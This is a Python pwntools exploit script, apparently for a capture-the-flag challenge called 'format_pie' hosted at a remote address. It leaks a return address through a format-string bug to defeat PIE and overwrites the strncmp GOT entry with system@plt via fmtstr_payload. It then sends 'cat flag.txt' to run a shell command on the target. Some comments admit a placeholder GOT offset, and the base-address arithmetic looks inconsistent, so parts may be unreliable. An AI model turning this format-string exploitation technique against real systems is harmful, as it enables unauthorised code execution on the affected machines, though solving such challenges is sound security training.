#!/usr/bin/env python3
from pwn import *

exe = ELF("./format_pie")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    print("TEST",args.LOCAL)
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("34.93.66.31", 46087)
    return r

def main():
    r = conn()

    # Step 1: Leak PIE Base
    # Offset 41 is return address to main (main+63 = 0x134d)
    r.sendlineafter(b"> ", b"%41$p")
    leak_str = r.recvline().strip().decode()
    leak_val = int(leak_str, 16)
    log.info(f"Leaked stack value: {hex(leak_val)}")
    
    # Calculate PIE Base
    # Remote return address offset: 0x13d7
    pie_base = leak_val - 0x13d7
    exe.address = pie_base + 0x8a
    log.info(f"PIE Base: {hex(pie_base)}")
    
    # Step 2: Overwrite strncmp GOT with system@plt
    # We need to find the correct GOT offset.
    # Local GOT: 0x4000. Remote likely shifted.
    # Placeholder for now.
    got_offset = 0x4000 # To be updated
    target_addr = pie_base + got_offset
    # strncmp is called when we type "exit" (or anything else)
    # We will send "cat flag.txt" to trigger system("cat flag.txt")
    
    system_plt = exe.plt['system']
    log.info(f"system@plt: {hex(system_plt)}")
    
    writes = {exe.got['strncmp']: system_plt}
    payload = fmtstr_payload(6, writes)
    
    r.sendlineafter(b"> ", payload)
    
    context.log_level = 'debug'
    
    # Step 3: Trigger
    # Send "cat flag.txt" to call system("cat flag.txt")
    r.sendlineafter(b"> ", b"cat flag.txt")
    
    # Read flag
    try:
        print(r.recvall(timeout=2).decode())
    except:
        pass

if __name__ == "__main__":
    main()
